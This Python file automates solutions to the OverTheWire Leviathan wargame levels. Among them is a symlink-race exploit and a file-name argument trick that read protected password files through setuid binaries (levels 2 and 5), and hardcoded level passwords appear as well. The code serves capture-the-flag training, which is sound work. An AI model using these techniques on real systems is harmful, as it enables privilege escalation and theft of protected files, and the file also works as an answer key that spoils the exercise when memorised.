"""Solver and level solutions for OTW Leviathan levels.
"""
import textwrap

from otw import solver


class LeviathanSolver(solver.OtwSolver):
  def __init__(self):
    super(LeviathanSolver, self).__init__('leviathan')

  def get_level_solution(self, level_num):
    return globals()['leviathan%d' % level_num]


def leviathan0(proc):
  # Single line is wrapped in the output (likely terminal width limitation)
  proc.sendline('grep -o "the password for leviathan1 is [^\\"]*" \\\n'
                '~/.backup/bookmarks.html | cut -d" " -f6')
  proc.expect(r'\$ ')
  return proc.before.splitlines()[2]


def leviathan1(proc):
  proc.sendline('~/check')
  proc.expect('password: ')
  proc.sendline('sex')


def leviathan2(proc):
  proc.sendline(textwrap.dedent("""
      exploit() {
          TEMP=`mktemp -d`
          chmod +rx "$TEMP"

          SYM="$TEMP/foo"
          DUMMY="$TEMP/bar"
          PWORD=/etc/leviathan_pass/leviathan3

          flip_symlink() {
              touch "$DUMMY"
              while true; do
                  ln -sf "$PWORD" "$SYM";
                  ln -sf "$DUMMY" "$SYM";
              done;
          }

          retry_printfile() {
              RESULT=
              while [[ ! "$RESULT" ]]; do
                  RESULT=`~/printfile "$SYM" | grep -v "You cant"`
              done
              echo $RESULT
          }

          # Run in subshell to suppress PID output
          { flip_symlink & } 2> /dev/null
          PID=$!
          retry_printfile
          kill "$PID"
      }
  """).strip())
  proc.expect(r'\$ ')
  proc.sendline('exploit')
  proc.expect(r'\$ ')
  return proc.before.splitlines()[1]


def leviathan2_alt(proc):
  fname = '/tmp/adadadaddada'
  proc.sendline('touch %s && ~/printfile %s /etc/leviathan_pass/leviathan3' %
          (fname, fname))
  proc.expect(r'\$ ')
  return proc.before.splitlines()[1]


def leviathan3(proc):
  proc.sendline('~/level3')
  proc.expect('Enter the password> ')
  proc.sendline('snlprintf')


def leviathan4(proc):
  proc.sendline('.trash/bin | rax2 -b')
  proc.expect(r'\$ ')
  return proc.before.splitlines()[1]


def leviathan5(proc):
  proc.sendline('ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log')
  proc.expect(r'\$ ')
  proc.sendline('./leviathan5')
  proc.expect(r'\$ ')
  return proc.before.splitlines()[1]


def leviathan6(proc):
  proc.sendline('./leviathan6 7123')
